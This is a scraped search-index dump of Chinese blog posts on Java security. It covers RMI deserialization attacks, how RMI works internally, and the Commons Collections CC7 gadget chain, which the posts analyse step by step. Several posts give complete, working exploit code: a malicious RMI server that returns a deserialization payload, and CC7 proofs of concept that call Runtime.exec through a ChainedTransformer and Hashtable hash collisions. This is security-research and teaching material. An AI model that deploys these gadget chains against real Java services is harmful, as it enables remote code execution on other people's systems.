(InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remot","date":"2024-06-30","objectID":"/posts/rm2/:2:0","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"攻击 Client 端 上面看到远程方法返回了一个命令执行结果到客户端，客户端会对其进行反序列化。意思是让返回结果为恶意对象就行。 这个就得服务端返回一个 object 对象了 服务端 package org.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.lang.reflect.*; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.util.HashMap; import java.util.Map; public class RMIobj extends UnicastRemoteObject implements RMIinter { protected RMIobj() throws RemoteException { super(); } public Object hello() throws RemoteException ,Exception{ InvocationHandler handler = null; try { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{ String.class, Class[].class}, new Object[]{ \"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{ Object.class, Object[].class}, new Object[]{ null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})}); HashMap innermap = new HashMap(); Class clazz = Class.forName(\"org.apache.commons.collections.map.LazyMap\"); Constructor[] constructors = clazz.getDeclaredConstructors(); Constructor constructor = constructors[0]; constructor.setAccessible(true); Map map = (Map) constructor.newInstance(innermap, chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map); }catch(Exception e){ e.printStackTrace(); } return (Object)handler; } }客户端进行调用 package org.example; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; public class cilent { public static void main(String[] args)throws RemoteException, NotBoundException { Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); System.out.println(Arrays.toString(registry.list())); RMIinter stub = (RMIinter) registry.lookup(\"Hello\"); stub.hello(); } } 参考：https://su18.org/post/rmi-attack/#2-攻击-registry-端 参考：https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164 参考：https://xz.aliyun.com/t/9053?time__1311=n4%2BxnD0DuAiti%3DGkD9D0x05Sb%2BDOSYKaNTNaTek4D#toc-1 ","date":"2024-06-30","objectID":"/posts/rm2/:3:0","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"java RMI反序列化-原理篇 前言：RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大。本文着重偏向于 RMI 通信原理的理解，如果只懂利用，就太脚本小子了。 这里有个坑点：就是 RMI 当中的攻击手法只在 jdk8u121 之前才可以进行攻击，因为在 8u121 之后，bind rebind unbind 这三个方法只能对 localhost 进行攻击，后续我们会提到。 ","date":"2024-06-30","objectID":"/posts/rmi1/:0:0","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"RMI 是什么？ Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。RMI 使用 JRMP(一种协议)实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。 ","date":"2024-06-30","objectID":"/posts/rmi1/:1:0","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"RMI 的架构 Stub和Skeleton Stub（存根）和 Skeleton（骨架），当客户端试图调用一个远端对象，实际上会调用客户端本地的一个代理类，也就是 Stub。而在调用服务端的目标类之前，也会经过一个对应的代理类，也就是 Skeleton。它从 Stub 接收远程方法调用并将它们传递给对象。 ","date":"2024-06-30","objectID":"/posts/rmi1/:1:1","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"RMI 实列元素 Client：客户端，客户端调用服务端的方法 Server：服务端，服务端通过绑定远程对象，这个对象可以封装很多网络操作，也就是 Socket Registry：注册中心，类比成 RMI 的电话薄。提供服务注册与服务获取。即 Server 端向 Registry 注册服务，比如地址、端口等一些信息，Client 端从 Registry 获取远程对象的一些信息，如地址、端口等，然后进行远程调用。 ","date":"2024-06-30","objectID":"/posts/rmi1/:1:2","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"RMI 的实现 这张图非常详细的描述了 RMI 的过程，先是远程的服务端创建并注册远程对象，然后客户端再进行查找的的时候先会去注册中心进行查找，然后注册中心返回服务端远程对象的存根 然后调用远程对象方法时，客户端本地存根和服务端骨架进行通信，然后就是骨架代理进行方法调用并且再服务端进行执行，然后骨架又把结果返回给存根，最后存根把结果给客户端，更详细的图 ","date":"2024-06-30","objectID":"/posts/rmi1/:2:0","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"一个RMI 实列 java. rmi. Remote 接口 java.rmi.Remote 接口用于标识可以从非本地虚拟机调用其方法的接口。任何作为远程对象的对象必须直接或者间接实现。只有那些远程接口（继承 java.rmi.Remote 接口）中指定的方法才可以远程使用。 java.rmi.server.UnicastRemoteObject类 RMI 提供了一些远程对象实现可以继承的便利类，这些类有助于远程对象的创建，其中包括java.rmi.server.UnicastRemoteObject类。这个类构造方法会调用exportObject或调用exportObject静态方法，它会返回远程对象代理类，也就是Stub。如果不继承该类可以手动调用其静态方法 exportObject 来手动 export 对象。 RMI Server 一、编写一个远程接口 远程接口要求： 使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系） 同时需要继承Remote类，也就是需要实现java.rmi.Remote接口 接口的方法需要声明java.rmi.RemoteException报错 服务端实现这个远程接口 定义一个我们期望能够远程调用的接口，这个接口必须扩展 java.rmi.Remote 接口，用来远程调用的对象作为这个接口的实例，也将实现这个接口，为这个接口生成的代理（Stub）也是如此。这个接口中的所有方法都必须声明抛出 java.rmi.RemoteException 异常， package org.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface RMIinter extends Remote { public String hello() throws RemoteException; }二、编写一个实现了这个远程接口的实现类 实现类要求： 实现远程接口 继承UnicastRemoteObject类（具体效果上面有说） 构造函数需要抛出一个RemoteException错误 实现类中使用的对象必须都可序列化，即都继承java.io.Serializable 注册远程对象 package org.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIobj extends UnicastRemoteObject implements RMIinter { protected RMIobj() throws RemoteException { super(); } public String hello() throws RemoteException { System.out.println(\"hello()被调用\"); return \"gaoren\"; } }现在被调用的对象就创建好了，接下来就是如何实现调用了。 RMI Registry 在上面的流程图不难看到还有个Registry 的思想（不再解释），这种思想主要由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。 1、java.rmi.Naming 这是一个 final 类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下： //host:port/name： host 表示注册表所在的主机 port 表示注册表接受调用的端口号，默认为 1099 name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字 Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。也就是说，Naming 是一个用来对注册表进行操作的类。而这些方法的具体实现，其实是调用 LocateRegistry.getRegistry 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的。 2、java.rmi.registry.Registry 这个接口在 RMI 下有两个实现类，分别是 RegistryImpl_Skel 以及 RegistryImpl_Stub。 我们通常使用 LocateRegistry#createRegistry() 方法来创建注册中心 package org.example; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class Registry { public static void main(String args[])throws Exception { LocateRegistry.createRegistry(1099); System.out.println(\"Server Start\"); // 创建远程对象 RMIinter rmiobj = new RMIobj(); // 绑定远程对象 Naming.bind(\"rmi://localhost:1099/Hello\", rmiobj); } }RMI Client 客户端进行调用，向注册中心查询相应的Name，调用相应的远程方法 package org.example; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; public class cilent { public static void main(String[] args)throws RemoteException, NotBoundException { Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); System.out.println(Arrays.toString(registry.list())); RMIinter stub = (RMIinter) registry.lookup(\"Hello\"); System.out.println(stub.hello()); } }这里 RMIinter 接口在 Client/Server/Registry 均应该存在，只不过通常 Registry 与 Server 通常在同一端上。 首先需要启动服务端RMI服务，运行服务端代码。然后客户端请求远程方法，也就是运行客户端的代码 服务端 客户端 这样一次简单的远程调用就完成了，不难发现其实方法的执行是在服务端执行的。 ","date":"2024-06-30","objectID":"/posts/rmi1/:2:1","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"源码分析 总共是 6 个互相通信过程+3 个创建过程。 ","date":"2024-06-30","objectID":"/posts/rmi1/:3:0","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"服务注册 创建远程服务 关键代码： RMIinter rmiobj = new RMIobj();在这句代码下上断点然后开始调试，在到 UnicastRemoteObject 构造函数之前，会先调用其静态方法进行一些赋值，不过不影响不用管，直接到其构造函数 初始化时会调用 exportObject 方法，这里的 obj 是我们要注册的远程对象。 可以看到这里的 exportObject 方法是个静态函数，所以说如果没有继承 UnicastRemoteObject 类可与进行静态调用其方法。然后其参数 new 了一个 UnicastServerRef 类，跟进一手 又 new 了一个 LiveRef 类，继续跟进 this 就是调用其构造函数，然后 new 的那个就是个 id，跟进其构造函数， 三个参数，第二个参数就是处理的网络请求，把端口进行一通处理，继续跟进 this 可以看到刚刚的第二个参数就是 ip 和端口嘛，然后出去。 其实这里总的来说就是创建了个 LiveRef 类然后将其赋值给服务端和客户端。 出来后继续跟进 exportObject 方法 这里可以看到把刚刚的 liveref 赋值给了 sref，也就是服务端。包含了我们的网络处理信息。 跟进 sref.exportObject 方法 可以看到这里出现了 stub 代理类，通过 createProxy 来创建的，跟进 先看下这里的三个参数 impClass 就是 stub 代理类，cilentRef 实质上还是之前创建的 ref。 继续看看到一处逻辑 最主要的是 stubClassExists(remoteClass)，其值为真就调用 if 语句，跟进看看： 因为这里的 remoteClass 没有 remoteClass_Stub 所以返回 false， 那么就会进行动态代理的创建，用 RemoteObjectInvocationHandler 为UnicastRef对象创建动态代理，最后会返回一个Remote类型的代理类，在调用代理类方法时，就会会调用 RemoteObjectInvocationHandler.invoke 方法，这个后面再议。 继续下一步，stub 创建好后其实可以看到里面最主要的还是 ref 部分。 再往下走，发现其创建了 target 类， 看其参数，也就是一个总封装，把前面那些对象什么的全部放了进去。 继续跟进看到调用了 ref.exportObject，然后一直跟进 最后到了 TCPTransport.exportObject 方法， listen() 里面就是涉及到网络请求的内容的，就是开启一个端口然后等待客户端连接进行操作。 可以看到就是已经开启端口了（默认的随机端口），然后又调用了父类的 exportObject 方法， 将Target对象存放进ObjectTable中，ObjectTable 用来管理所有发布的服务实例 Target。 其实总的来说涉及到的大多是网络通信的东西，就是把创建的 ref 赋值给服务端然后创建个 stub，在把前面那些对象全部封装进 target，然后在 TCPTransport 中对网络通信进行处理发布服务，最后把 target 放进 ObjectTable 中。 创建注册中心 LocateRegistry.createRegistry(1099);跟进 createRegistry 函数， new 了一个 RegistryImpl 对象，继续跟进， 看到这里和上面远程对象注册很像，都 new 了个 liveref 对象，这里就不在跟进了和上面是一样的。 继续走又创建了个 UnicastServerRef 对象， 就是个赋值，跟进 setup 方法里面， 调用了 uref.exportObject 方法，回顾上面的远程对象注册，是调用的 sref.exportObject， 其实都是 UnicastServerRef 的 exportObject 方法，这里的 this 是 RegestryImpl 对象 继续跟进 又是创建 stub，不过稍有区别了，跟进 这里的 RometeClass 是 RegestryImpl 对象，由于存在 RegestryImpl_Stub ，所以会返回 true，执行 if 语句。 执行的 createStub 方法其实也就是创建了个 RegestryImpl_Stub 实列化对象， 最后回到 exportObject 方法，stub 代理类也就创建好了，对比和上面远程对象注册中的 stub 确实不一样，上面的 stub 是动态代理创建的。 然后又因为满足下面的 if 条件会执行 setSkeleton 方法 看到又是创建 skle 代理，其实和 stub 代理创建差别不大，实列化了 RegestryImpl_Skel 对象 最后又是创建了个 target 对象 也是把刚刚那些对象进行一个总封装，不过比起上面的远程对象注册多了个远程对象 Impl 中多了 skel 对象，并且 stub 对象也不一样了。 最后还是调用 putTarget 方法将其添加进 objecttable 中，可以看到多了一个 hashmap，11 是远程对象注册添加的，至于那个 2 是 DGC ，后面再说。 创建注册中心与创建远程服务的大部分流程相同，差异在： 远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel 远程对象默认随机端口，注册中心默认是 1099（当然也可以指定） 服务端绑定 关键代码， Naming.bind(\"rmi://localhost:1099/Hello\", rmiobj); 先是把两个参数进行处理，然后只把 name 被 obj 传入 registry.bind 中。 调用了 newCall 方法，（这里我这个类是 class 文件，没有源码无法正常调试，随便调调好了） 继续跟进， 看到熟悉的 ref 了，总之这个方法就是建立一个连接，然后继续看到会对其进行序列化， 然后执行了UnicastRef.invoke方法， 跟进后在方法 executeCall ，在该方法中又对连接对象行了反序列化。 这个应该属于远程绑定，一般服务端和注册中心在一端可以直接执行如下命令进行绑定 java.rmi.registry.Registry r = LocateRegistry.createRegistry(1099); r.bind(\"Hello\", rmiobj);这个 bind 就太好分析了，就不多说了。 ","date":"2024-06-30","objectID":"/posts/rmi1/:3:1","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"服务发现 服务发现，就是获取注册中心并对其进行操作的过程，这里面包含 Server 端和 Client 端两种。如果是在 Server 端，我们希望在注册中心上绑定（bind）我们的服务，如果是 Client 端，我们希望在注册中心遍历（list）、查找（lookup）和调用服务。 相应代码： RMIinter stub = (RMIinter) registry.lookup(\"Hello\");调用 lookup 方法，通过对应的 RMI_NAME，获取远程对象接口 同样是个建立个连接，然后对 remoteCall 进行序列化。 又通过 UnicastRef.invoke 方法传输这个 remoteCall，通过反序列化来获取注册远程对象时创建的代理类 stub。 最后return这个对象。 ","date":"2024-06-30","objectID":"/posts/rmi1/:3:2","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"整个服务调用三个地方过程 上面 Client 拿到 Registry 端返回的动态代理对象并且反序列化后，对其进行调用，这看起来是本地进行调用，但实际上是动态代理的 RemoteObjectInvocationHandler 委托 RemoteRef 的 invoke 方法进行远程通信，由于这个动态代理类中保存了真正 Server 端对此项服务监听的端口，因此 Client 端直接与 Server 端进行通信。 客户端 话不多说，直接看 stub 是个动态代理类，在其调用 hello() 方法的时候会直接调用到 handler 的 invoke 方法， 最后调用到了invokeRemoteMethod 函数 跟进，这里 ref 是 UnicastRef，会调用其 invoke 方法。 marshalValue() 就是进行序列化，是对传入的参数进行序列化，只是这里调用的 hello 方法是个无参方法。 然后继续看见调用了executeCall 函数。 刚刚上面服务注册不难看出里面可以进行反序列化，这里不在深入了，继续看这个 invoke 方法逻辑，发现如果方法有返回值还会调用 unmarshalValue 方法进行反序列化， 但是由于这里返回值是 string 型不符合条件会直接返回。 到此客户端的方法调用就结束了。 这里又两个反序列化的点，第一个就是直接的 stub 进行反序列化，第二个就是返回值进行反序列化。 注册中心 接下来继续看注册中心，要从 listen 哪里开始跟进，总之就是发布网络后处理一些请求的 JRMP 协议内容，最后调用到了 serviceCall 方法 可以对 objectTable 进行了个获取，看看 target 里是什么 就是注册中心的 stub 嘛，然后继续看发现其分发器 disp 里有 skel 代理类 在该函数最下面调用了 disp.dispatch 方法 然后继续看，skel 不是 null 满足条件执行 if 语句，调用 oldDispatch 方法， 在这个方法里面最后调用到了 skle 的 dispatch 方法 跟踪进入 由于这个类是 class 文件，就简单分析一下吧，有很多 case，然后这里客户端调用的是 lookup 方法是 2 就是查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。 服务端 最后在看服务端是怎么处理的。 前面是差不多的就是在进行 skle 的条件判断的时候会是 false 不会执行 if 语句，继续向下走， 发现其会把在客户端进行序列化的参数进行反序列化（我这里方法没有参数无法进行调试）。 最后进行方法调用。 然后再把返回值进行序列化 至此就完美闭环了。 ","date":"2024-06-30","objectID":"/posts/rmi1/:3:3","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"总结 RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下： RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。 Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。 RemoteCall 序列化 RMI 服务名称、Remote 对象。 RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。 RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。 Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。 Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。 RMI 客户端反序列化服务端结果，获取远程对象的引用。 RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。 RMI 客户端反序列化 RMI 远程方法调用结果。 ","date":"2024-06-30","objectID":"/posts/rmi1/:3:4","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"DGC Distributed Garbage Collection，分布式垃圾回收 当 RMI 服务器返回一个对象到其客户端（远程方法的调用方）时，其跟踪远程对象在客户机中的使用。当再没有更多的对客户机上远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。 在前面远程对象注册时调用 put 时发现，在还没有 put 进行封装 target 时，里面已经存在一个 target 了。 可以看见其 stub 是 DGCImpl_Stub 类，那这个是怎么创建的呢？可以看见在执行 putTarget 方法时有这么一串代码 因为这里的 dgclog 是个静态变量 在调用静态变量时会完成类的初始化，最后会创建代理类 从上面的 target 不难看出这里的 stub 创建更像注册中心中 stub 的创建，因为 DCGImpl 存在 DCGImpl_Stub，所以相同的还会创建 DGCImpl_Skel 对象。 Java提供了java.rmi.dgc.DGC接口，这个接口继承了Remote接口，定义了dirty和clean方法 看到 dirty 方法调用了 UnicastRef.invoke 方法， 剩下的就是里面反序列化了。然后再看服务端的 DCGImpl_Skel 中 case1 或 2 就是对应的不同方法嘛，也是存在反序列化的。 参考：https://su18.org/post/rmi-attack/#2-攻击-registry-端 参考：https://nivi4.notion.site/Java-RMI-8eae42201b154ecc89455a480bcfc164 参考：https://xz.aliyun.com/t/9053?time__1311=n4%2BxnD0DuAiti%3DGkD9D0x05Sb%2BDOSYKaNTNaTek4D#toc-1 ","date":"2024-06-30","objectID":"/posts/rmi1/:3:5","tags":["java","反序列化"],"title":"java RMI反序列化-原理篇","uri":"/posts/rmi1/"},{"categories":["javasec"],"content":"cc7分析 Hashtable.readObject Hashtable.reconstitutionPut AbstractMapDecorator.equals AbstractMap.equals LazyMap.get() ChainedTransformer.transform() ...cc7也是接着LazyMap.get()方法向上找。这里先给出LazyMap.get()执行命令的构造： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,cha); Lazy.get(Runtime.getRuntime()); } }接着就又是向上找嘛，但这里我们就不找了，看了 ysoserial 的 cc7 中是利用的Hashtable.readObject()作为起点类，进行正向分析 ","date":"2024-06-29","objectID":"/posts/cc7/:1:0","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"Hashtable.readObject 跟进到Hashtable.readObject()： 在最后调用的是reconstitutionPut方法，这里的key，value值可以通过hashtable中的put方法进行添加。（回忆一下在cc6中的hashmap最后是调用的putValue中的hash函数来触发的hashcode，key，value也是通过put方法来添加的；而hashset是最后是调用的put方法，值是利用add添加）。 跟进到 reconstitutionPut 方法中看看： 这里关键在于equals方法的调用（hashcode也可以做文章后面再说），先进入for语句，然后就是个if判断语句了，执行了e.hash和e.key.equals(key)。不过Java语言还存在一个布尔短路运输的特性，也就是说当e.hash == hash判定为假，就会直接退出if语句，导致不执行e.key.equals(key)。所以我们还得让e.hash == hash为真， hash就是key.hashcode嘛。那么再看e是什么： Entry\u003c?,?\u003e e = tab[index] ; e != null ; e = e.next 这里可能还有点迷，继续看看index是什么 int index = (hash \u0026 0x7FFFFFFF) % tab.length; 通过以上分析，这里大概意思就是先计算出 key 的 hash 值, index 就是个索引，通过索引得到 table 里面的 hashmap 值，这个 next 是个 null ，不用管。 然后进入 if 判断比较 table 里面 hashmap 和现在这个 hashmap 的 hash 值是否相同，不同就把这个键值对加入到 tab 中。当然我们想要的是两个 hashmap 的 key 的 hash 相同。 其实这里也就是循环添加键值对到 tab 中，很显然当只有一个键值对的时候，hash 肯定不相同，我们需要至少两个键值对，当第一个键值对添加后，第二个和第一个进行比较，所以要执行两次put语句。 那是不是直接把两个键值对的key值改为一样就行了，这个在readObject中进行了判断： 看到最下面还原table数组时是根据elements来判断的，而如果key相同时 element 计算会把两个 map 计算为只有一个 map。这个可以里hash碰撞进行解决。 ","date":"2024-06-29","objectID":"/posts/cc7/:1:1","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"AbstractMapDecorator.equals 继续看会调用equals方法，在ysoserial中把e.key为LazyMap对象，但是LazyMap对象没有equals方法，不过它继承了AbstractMapDecorator类，所以会调用AbstractMapDecorator类的equals方法： 然后还会调用 map.equals()，那么这里的map是什么呢，朔源到 LazyMap 中，发现在我们在构造poc时为了使 LazyMap 调用到 ChainedTransformer 的 transform 方法，用了 LazyMap.decorate(map,chainedTransformer); 而这里的map就是 HashMap，但是 HashMap 中没有 equals 方法，发现它继承了 AbstractMap 类。 ","date":"2024-06-29","objectID":"/posts/cc7/:1:2","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"AbstractMap.equals 跟进到AbstractMap类中的equals方法： 在这里进行了get方法的调用，条件是当value不为null时。其中m为传入equals的Object，我们需要让m为LazyMap对象，朔源也就是key要为LazyMap对象： 意思时e.key和key都要为LazyMap对象，这是什么意思呢，刚刚不是说了两个键值对的键不能相同嘛。所以可以让LazyMap的map中的key值不一样或者value值不一样。意思是这里table的key是个map数组，那么最上面的key.hashcode又是怎么计算的呢？后面调试会发现key.hashcode传入的是数组的话，最后的hash值是key的hash值异或value的hash值。 所以归根结底还是只用让为LazyMap对象中map键值对的key不同而其hash值相同就行了，value就设为一样的就行（因为也要保证其hash值一样）。 那么构造： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); Map\u003cObject, Object\u003e Lazy1 = LazyMap.decorate(map1,cha); Lazy1.put(\"yy\",1); Map\u003cObject, Object\u003e Lazy2 = LazyMap.decorate(map2, cha); Lazy2.put(\"zZ\",1); Hashtable hashtable = new Hashtable(); hashtable.put(Lazy1,1); hashtable.put(Lazy2,1); serilize(hashtable); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }yy和zZ的hash值是一样的，原理看最下面。运行执行了计算机，但是不是在反序列化执行的。 ","date":"2024-06-29","objectID":"/posts/cc7/:1:3","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"解决put问题一、 看了师傅们的文章发现是在hashtable.put(Lazy2,1);出的问题，跟进put方法 看到put方法中这串代码怎么这么熟悉。那是不是在进行判断后会像上面设计的一样直接调用到get方法，注释掉序列化和反序列化对get方法打断点，发现在执行第二个put方法的时候直接调用了get方法，然后提前执行命令，还有就是和cc6一样的问题，因为get在执行后会添加key值，导致反序列化的时候就不能执行到transform方法了。 所以在put后最后要删掉Lazy2的yy键值对 Lazy2.remove(\"yy\");至此其实已经可以反序列化并执行命令了。 ","date":"2024-06-29","objectID":"/posts/cc7/:1:4","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"解决put问题二、 为了更完美使其在put的时候不会执行命令，可以仿造cc6先把transformer对象随便弄一个然后在利用反射修改factory属性 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); Map\u003cObject, Object\u003e Lazy1 = LazyMap.decorate(map1,cha); Lazy1.put(\"yy\",1); Map\u003cObject, Object\u003e Lazy2 = LazyMap.decorate(map2,new ConstantTransformer(1)); Lazy2.put(\"zZ\",1); Hashtable hashtable = new Hashtable(); hashtable.put(Lazy1,1); hashtable.put(Lazy2,1); Lazy2.remove(\"yy\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy2, cha); serilize(hashtable); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }但是发现失败了，发现在最后的table里面只put进了一个数组： 